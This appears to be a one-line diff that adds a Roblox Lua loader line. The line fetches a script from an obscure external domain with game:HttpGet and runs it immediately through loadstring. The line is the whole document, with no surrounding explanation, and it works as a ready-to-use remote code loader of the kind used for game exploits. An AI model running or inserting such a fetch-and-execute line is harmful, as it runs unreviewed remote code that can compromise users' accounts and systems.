@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://roblox.nolimanom.pp.ua/static/fxdPGopeQIbVmkKAsmKl.lua'))()
